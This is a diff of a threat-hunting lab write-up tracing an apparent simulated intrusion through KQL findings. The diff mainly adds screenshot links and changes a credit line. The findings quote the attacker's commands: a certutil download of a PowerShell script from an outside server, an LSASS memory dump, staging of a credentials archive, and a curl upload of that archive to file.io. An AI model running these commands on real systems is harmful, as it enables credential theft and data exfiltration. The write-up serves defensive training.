@@ -1,10 +1,10 @@
 # 🚢 Threat Hunt SAGA#2: Cargo Hold
 
-<img width="740" height="1110" alt="CARGO HOLD" src="https://github.com/user-attachments/assets/placeholder-cargo-hold-image" />
+<img width="740" height="1110" alt="CARGO HOLD" src="https://github.com/user-attachments/assets/ce955900-3d60-46cd-b27c-bb304cacc37d" />
 
 **Sandbox Contributor:** [Cyber Range AZURE LAW by Josh Madakor's team](https://www.skool.com/cyber-community)  
 **Hunt Design Master:** Mohammed A  
-**Loyal Wingman (woman):** [Adetola Kolawole](https://github.com/AdetolaKols), Agentic SOC Analyst
+**Loyal Wingman (woman):** [MixLocalAgentic_SOC_Analyst](https://github.com/Panbear1983/Multi-Funtion_SOC_Agent_Research/tree/main/openAI_Agentic_SOC_Analyst)
 
 <hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">
 
@@ -196,6 +196,7 @@ DeviceLogonEvents
 
 **Output:** `159.26.106.98`  
 **Finding:** The logs reveal a new external IP address `159.26.106.98` initiating RDP sessions approximately 72 hours after the initial compromise. This change in source IP is consistent with adversary tradecraft to avoid detection based on previously identified IOCs.
+<img width="931" height="302" alt=" 11282825 63621626 19" src="https://github.com/user-attachments/assets/dc462a64-197c-4e7b-bb64-b121e4895367" />
 
 ---
 
@@ -224,6 +225,7 @@ DeviceLogonEvents
 
 **Output:** `AZUKI-FileServer01`  
 **Finding:** The query results show successful logon events to `AZUKI-FileServer01` following the return access. File servers are prime targets for data theft operations, making this lateral movement consistent with the adversary's collection objectives.
+<img width="913" height="271" alt="backup-admin" src="https://github.com/user-attachments/assets/e8e9e29f-1546-497d-b8c3-5526d995c86d" />
 
 ---
 
@@ -252,6 +254,7 @@ DeviceLogonEvents
 
 **Output:** `fileadmin`  
 **Finding:** The account `fileadmin` was used to authenticate to the file server. This privileged account provides broad access to file shares, enabling the attacker to discover and stage sensitive data for exfiltration.
+<img width="1185" height="202" alt="Pasted Graphic 2" src="https://github.com/user-attachments/assets/e51fad53-9933-4dd5-b898-324d9d3ddaa9" />
 
 ---
 
@@ -280,6 +283,7 @@ DeviceProcessEvents
 
 **Output:** `"net.exe" share`  
 **Finding:** The `net.exe share` command enumerates all shared resources on the local system. This discovery step allows the attacker to identify available file shares containing potentially sensitive data for subsequent collection.
+<img width="1184" height="214" alt="Pasted Graphic 3" src="https://github.com/user-attachments/assets/1c77edf0-64c8-416e-adca-620c9b719b56" />
 
 ---
 
@@ -308,6 +312,7 @@ DeviceProcessEvents
 
 **Output:** `"net.exe" view \\10.1.0.188`  
 **Finding:** The attacker used `net.exe view \\10.1.0.188` to enumerate shares on a remote system. This reconnaissance expands the attacker's understanding of data locations across the network, potentially identifying additional targets.
+<img width="886" height="271" alt="11222001, 124033316 AM" src="https://github.com/user-attachments/assets/d7a620b6-8fe2-4978-917c-c2bd741385af" />
 
 ---
 
@@ -336,6 +341,7 @@ DeviceProcessEvents
 
 **Output:** `whoami.exe /all`  
 **Finding:** The `whoami.exe /all` command displays comprehensive information about the current user including username, SID, group memberships, and privileges. This helps the attacker understand their access level on the compromised system.
+<img width="878" height="100" alt="weGenerated (UTC)" src="https://github.com/user-attachments/assets/a74a352d-a1e6-4ca1-9f3b-f6f1c3a381e3" />
 
 ---
 
@@ -364,6 +370,7 @@ DeviceProcessEvents
 
 **Output:** `ipconfig.exe /all`  
 **Finding:** The `ipconfig.exe /all` command provides detailed network adapter configuration including IP addresses, subnet masks, gateways, and DNS servers. This information supports further network reconnaissance and lateral movement planning.
+<img width="861" height="74" alt=" 11222025 124244 365 AM" src="https://github.com/user-attachments/assets/3d2bad79-1f2a-4393-b953-126c8654bc75" />
 
 ---
 
@@ -392,6 +399,7 @@ DeviceProcessEvents
 
 **Output:** `attrib.exe +h +s C:\Windows\Logs\CBS`  
 **Finding:** The `attrib.exe +h +s` command sets both hidden and system attributes on the staging directory. This makes the folder invisible in standard directory listings and marks it as a protected system directory, reducing the chance of discovery.
+<img width="1196" height="175" alt="Pasted Graphic 7" src="https://github.com/user-attachments/assets/a1c9fa5c-0adb-4c5b-b41e-c3e4cf1765d5" />
 
 ---
 
@@ -420,6 +428,7 @@ DeviceProcessEvents
 
 **Output:** `C:\Windows\Logs\CBS`  
 **Finding:** The staging directory `C:\Windows\Logs\CBS` was chosen because it appears to be a legitimate Windows system path (CBS = Component-Based Servicing). This location helps the attacker's activities blend with normal system operations.
+<img width="1100" height="67" alt="Pasted Graphic 8" src="https://github.com/user-attachments/assets/9fe20dae-c372-49fc-b95b-e7bf1521816d" />
 
 ---
 
@@ -448,6 +457,7 @@ DeviceProcessEvents
 
 **Output:** `certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`  
 **Finding:** The attacker used `certutil.exe` with `-urlcache -f` to download a PowerShell script from an external C2 server (`78.141.196.6:7331`). This LOLBin technique bypasses application allowlists that block unknown executables.
+<img width="1092" height="131" alt="Pasted Graphic 9" src="https://github.com/user-attachments/assets/43d8b006-7de2-4753-9c2d-2613466784e2" />
 
 ---
 
@@ -476,6 +486,7 @@ DeviceFileEvents
 
 **Output:** `IT-Admin-Passwords.csv`  
 **Finding:** The file `IT-Admin-Passwords.csv` was discovered on the file server. This spreadsheet likely contains credentials for IT administrative accounts, representing a significant security exposure and high-value target for the attacker.
+<img width="1148" height="130" alt="Pasted Graphic 10" src="https://github.com/user-attachments/assets/c4e7fd08-afeb-4bc7-8f5e-d4363d82786f" />
 
 ---
 
@@ -504,6 +515,7 @@ DeviceProcessEvents
 
 **Output:** `xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`  
 **Finding:** The `xcopy.exe` command with `/E /I /H /Y` flags recursively copied the entire IT-Admin share to the staging directory, preserving hidden files and overwriting existing files without prompts. This staged the data for compression and exfiltration.
+<img width="1104" height="186" alt="Pasted Graphic 11" src="https://github.com/user-attachments/assets/05228693-b774-4cf0-aacf-0e0777c647b2" />
 
 ---
 
@@ -532,6 +544,7 @@ DeviceProcessEvents
 
 **Output:** `tar.exe -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`  
 **Finding:** The `tar.exe` command with `-czf` flags created a gzip-compressed tar archive of the staged IT-Admin data. The `-C` flag changed to the source directory before archiving, creating a clean archive structure.
+<img width="1134" height="246" alt="Pasted Graphic 12" src="https://github.com/user-attachments/assets/366810e7-ca84-445d-b696-081354a94738" />
 
 ---
 
@@ -560,6 +573,7 @@ DeviceProcessEvents
 
 **Output:** `pd.exe`  
 **Finding:** The credential dumping tool was renamed to `pd.exe` to avoid detection based on the original filename (likely procdump.exe). This simple OPSEC technique helps evade file-based signatures while maintaining functionality.
+<img width="781" height="125" alt=" 117820 60641330 AM" src="https://github.com/user-attachments/assets/4d672dfc-85ba-45ed-bad4-1213a8631b8a" />
 
 ---
 
@@ -588,6 +602,7 @@ DeviceProcessEvents
 
 **Output:** `pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`  
 **Finding:** The renamed Procdump (`pd.exe`) was used with `-accepteula -ma` flags to create a full memory dump of the LSASS process (PID 876). The dump file was written to the staging directory for offline credential extraction.
+<img width="787" height="76" alt="Pasted Graphic 14" src="https://github.com/user-attachments/assets/7a8e5e30-79e6-49c4-8eb5-1f924463b1e6" />
 
 ---
 
@@ -616,6 +631,7 @@ DeviceProcessEvents
 
 **Output:** `curl.exe -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`  
 **Finding:** The `curl.exe` command with `-F file=@` uploads the compressed archive via HTTP POST to file.io. This method uses a legitimate file sharing service to blend exfiltration traffic with normal web activity.
+<img width="1170" height="187" alt="Pasted Graphic 15" src="https://github.com/user-attachments/assets/d61ef2a7-a4be-44bc-adac-0dc22b7f6dd6" />
 
 ---
 
@@ -644,6 +660,7 @@ DeviceNetworkEvents
 
 **Output:** `file.io`  
 **Finding:** The exfiltration destination `file.io` is a public file sharing service that provides anonymous, temporary file hosting. This service is commonly abused for data exfiltration because uploads appear as legitimate HTTPS traffic.
+<img width="1157" height="152" alt="Pasted Graphic 16" src="https://github.com/user-attachments/assets/055fd6af-91cc-4ae2-9a9b-3cb2d1cd34d1" />
 
 ---
 
@@ -673,6 +690,7 @@ DeviceRegistryEvents
 
 **Output:** `FileShareSync`  
 **Finding:** The registry value `FileShareSync` was added to a Run key for persistence. The name mimics legitimate file synchronization software, reducing suspicion during manual registry inspection.
+<img width="713" height="137" alt="11222720051211-29916 AM" src="https://github.com/user-attachments/assets/15b0bcfc-f242-4e74-bc1f-a51e902bb563" />
 
 ---
 
@@ -701,6 +719,7 @@ DeviceRegistryEvents
 
 **Output:** `svchost.ps1`  
 **Finding:** The persistence beacon `svchost.ps1` is named to mimic the legitimate Windows service host process. This masquerading technique makes the malicious script appear as a system file during casual inspection.
+<img width="1152" height="130" alt="Pasted Graphic 18" src="https://github.com/user-attachments/assets/2acfa1da-0ba9-44ff-81f0-0dee7b9a6315" />
 
 ---
 
@@ -730,6 +749,7 @@ DeviceFileEvents
 
 **Output:** `ConsoleHost_history.txt`  
 **Finding:** The file `ConsoleHost_history.txt` is the default PowerShell command history file. Deleting this file removes a forensic record of PowerShell commands executed by the attacker, complicating incident response.
+<img width="924" height="71" alt="İntiatingfrecenCemmand is" src="https://github.com/user-attachments/assets/b0e06ebb-1dd8-4478-b74d-2c39c3b94991" />
 
 <hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">
 
